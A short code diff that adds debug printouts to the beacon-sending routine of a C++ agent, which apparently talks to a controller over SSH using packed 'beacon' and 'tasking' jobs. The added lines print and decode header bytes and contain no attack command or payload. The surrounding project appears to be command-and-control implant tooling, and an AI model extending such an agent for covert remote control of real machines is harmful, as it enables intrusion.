@@ -437,6 +437,18 @@ int Agent::run()
 					AgentJob *beacon_job = new AgentJob(AGENT_SEND_BEACON, strlen(beacon), beacon);
 					int len = beacon_job->get_len()+8;
 					printf("Length: %lu\n", len);
+					unsigned char* packed = (unsigned char*)beacon_job->pack();
+					printf("hdr: ");
+					for(int i = 0; i < 8; i++) {
+    				    printf("%x ", packed[i]);
+    				}
+					unsigned long h_val = AgentJob::bytes_to_long(packed);
+					AgentJob *job = new AgentJob(h_val, nullptr);
+					printf("Tasking values: %x, %lu\n", job->get_type(), job->get_len());
+    
+    
+    				printf("\n"); 
+    
 					if(this->write((char*)beacon_job->pack(), len) == SSH_ERROR) return SSH_ERROR;
 					break;
 				}
